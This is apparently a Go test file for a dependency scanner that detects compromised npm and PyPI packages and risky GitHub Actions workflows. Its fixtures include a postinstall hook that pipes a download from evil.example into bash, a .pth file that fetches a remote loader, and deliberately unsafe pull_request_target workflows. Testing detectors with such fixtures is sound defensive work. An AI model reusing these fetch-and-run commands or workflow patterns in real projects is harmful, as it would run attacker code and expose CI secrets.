package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/depsaber/depsaber/internal/intel"
)

func TestScanDetectsKnownCompromisedPackagesAcrossEcosystems(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "package-lock.json", `{
  "name": "victim",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/axios": {"version": "1.14.1"},
    "node_modules/plain-crypto-js": {"version": "4.2.1"},
    "node_modules/@tanstack/react-router": {"version": "1.169.5"}
  }
}`)
	writeFile(t, root, "requirements.txt", "mistralai==2.4.6\nguardrails-ai==0.10.1\n")
	writeFile(t, root, "poetry.lock", `[[package]]
name = "litellm"
version = "1.82.7"
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertFinding(t, report.Findings, "malicious.npm.axios")
	assertFinding(t, report.Findings, "malicious.npm.plain-crypto-js")
	assertFinding(t, report.Findings, "malicious.npm.tanstack-mini-shai-hulud")
	assertFinding(t, report.Findings, "malicious.pypi.mistralai")
	assertFinding(t, report.Findings, "malicious.pypi.guardrails-ai")
	assertFinding(t, report.Findings, "malicious.pypi.litellm")
}

func TestScanDetectsPackageManagerBehavioralRisks(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "package.json", `{
  "scripts": {
    "postinstall": "curl https://evil.example/payload.sh | bash"
  },
  "dependencies": {
    "left-pad": "^1.3.0"
  }
}`)
	writeFile(t, root, "src/evil.pth", "import urllib.request; urllib.request.urlopen('https://evil.example/loader.py')\n")

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertFinding(t, report.Findings, "risk.npm.missing-lockfile")
	assertFinding(t, report.Findings, "risk.npm.lifecycle-network-shell")
	assertFinding(t, report.Findings, "risk.npm.floating-range")
	assertFinding(t, report.Findings, "risk.pypi.pth-exec")
}

func TestScanDetectsRiskyGitHubActionsWorkflow(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, ".github/workflows/ci.yml", `name: unsafe
on:
  pull_request_target:
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: deps-${{ github.ref }}
      - run: npm install
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertFinding(t, report.Findings, "risk.github.pull-request-target")
	assertFinding(t, report.Findings, "risk.github.untrusted-checkout")
	assertFinding(t, report.Findings, "risk.github.broad-permissions")
	assertFinding(t, report.Findings, "risk.github.unsafe-oidc")
	assertFinding(t, report.Findings, "risk.github.unpinned-action")
	assertFinding(t, report.Findings, "risk.github.cache-poisoning")
	assertFinding(t, report.Findings, "risk.github.nondeterministic-install")
}

func TestScanDetectsTanStackStylePullRequestTargetMergeCheckout(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, ".github/workflows/bundle-size.yml", `name: bundle-size
on:
  pull_request_target:
jobs:
  benchmark-pr:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: actions/cache@v4
        with:
          path: .pnpm-store
          key: deps-${{ github.ref }}
      - run: pnpm nx run @benchmarks/bundle-size:build
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertFinding(t, report.Findings, "risk.github.pull-request-target")
	assertFinding(t, report.Findings, "risk.github.untrusted-checkout")
	assertFinding(t, report.Findings, "risk.github.cache-poisoning")
}

func TestScanDetectsTanStackOptionalDependencyIOC(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "package-lock.json", `{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/@tanstack/react-router": {
      "version": "1.169.5",
      "optionalDependencies": {
        "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
      }
    }
  }
}`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertFinding(t, report.Findings, "risk.npm.tanstack-optional-dependency-ioc")
}

func TestScanTreatsBunLockAsJavaScriptLockfileAndDetectsBunInstall(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "package.json", `{
  "dependencies": {
    "left-pad": "1.3.0"
  }
}`)
	writeFile(t, root, "bun.lock", `plain-crypto-js 4.2.1
`)
	writeFile(t, root, ".github/workflows/ci.yml", `name: ci
on:
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      - run: bun install
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertNoFinding(t, report.Findings, "risk.npm.missing-lockfile")
	assertFinding(t, report.Findings, "malicious.npm.plain-crypto-js")
	assertFinding(t, report.Findings, "risk.github.nondeterministic-install")
}

func TestScanAllowsFrozenBunInstall(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, ".github/workflows/ci.yml", `name: ci
on:
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      - run: bun install --frozen-lockfile
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertNoFinding(t, report.Findings, "risk.github.nondeterministic-install")
}

func TestScanAllowsTrustedTagReleaseWorkflowToWriteContents(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, ".github/workflows/release.yml", `name: Release
on:
  push:
    tags:
      - v*
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      - run: gh release create "$GITHUB_REF_NAME" dist/release/* --generate-notes --verify-tag
`)

	report, err := New(Options{Root: root, Feed: intel.BuiltinFeed()}).Scan()
	if err != nil {
		t.Fatal(err)
	}

	assertNoFinding(t, report.Findings, "risk.github.broad-permissions")
	assertNoFinding(t, report.Findings, "risk.github.unsafe-oidc")
}

func writeFile(t *testing.T, root, name, content string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(name))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
